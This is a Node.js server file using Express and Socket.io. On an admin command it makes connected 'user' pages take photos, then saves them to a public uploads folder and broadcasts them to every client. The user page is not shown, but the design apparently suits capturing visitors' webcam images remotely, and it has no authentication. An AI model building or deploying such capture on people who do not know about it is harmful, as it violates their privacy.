const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Folder setup for local offline storage
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadDir));

io.on('connection', (socket) => {
    console.log('⚡ Connected Device ID:', socket.id);

    // Admin manual button trigger
    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    // Receive photo from user & process
    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
        const fileName = `photo_${Date.now()}.png`;
        const filePath = path.join(uploadDir, fileName);

        // Auto Save to disk (Offline Admin solution)
        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Auto-Saved: uploads/${fileName}`);
        });

        // Broadcast to Admin live UI
        io.emit('send-photo-to-admin', imageData);
    });
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`\n🚀 SERVER RUNNING!`);
    console.log(`👉 User Link:  http://localhost:${PORT}/user.html`);
    console.log(`👉 Admin Link: http://localhost:${PORT}/admin.html\n`);
});